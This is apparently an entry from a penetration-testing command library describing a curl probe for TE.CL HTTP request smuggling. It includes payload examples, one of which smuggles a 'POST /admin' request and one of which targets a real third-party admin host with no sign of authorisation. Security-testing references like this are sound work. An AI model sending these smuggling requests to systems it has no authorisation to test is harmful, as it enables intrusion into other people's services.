---
data: >-
  curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data
  "0\r\n\r\nG" https://target.com/
tags:
  - http-smuggling
  - recon
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d44f206b-73af-40da-9a99-e1818f005c7d
created_at: '2025-12-13T09:01:26.261Z'
updated_at: '2025-12-13T09:01:26.261Z'
verified: false
validated: true
submitted: true
---
# curl-http-smuggling-test

## Command

```bash
curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data "0\r\n\r\nG" https://target.com/
```

## Description

This command tests for TE.CL HTTP request smuggling by sending a request with conflicting headers to detect parsing inconsistencies between front-end and back-end.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for debugging | No |
| `-H "Transfer-Encoding: chunked"` | Sets chunked encoding | Yes |
| `-H "Content-Length: 4"` | Sets conflicting content length | Yes |
| `--data "0\r\n\r\nG"` | Payload for smuggling test | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 4" --data "0\r\n\r\nG" https://admin-official.line.me/
```

### Advanced Usage

```bash
curl -v -H "Transfer-Encoding: chunked" -H "Content-Length: 10" --data "0\r\n\r\nPOST /admin" https://target.com/
```

## Expected Output

Verbose output showing response codes; success indicated by 200 OK or parsing errors revealing smuggling.

## Related
- [[procedures/Identify-HTTP-Request-Smuggling-Vulnerability]]
- [[commands/burp-repeater-smuggle]]
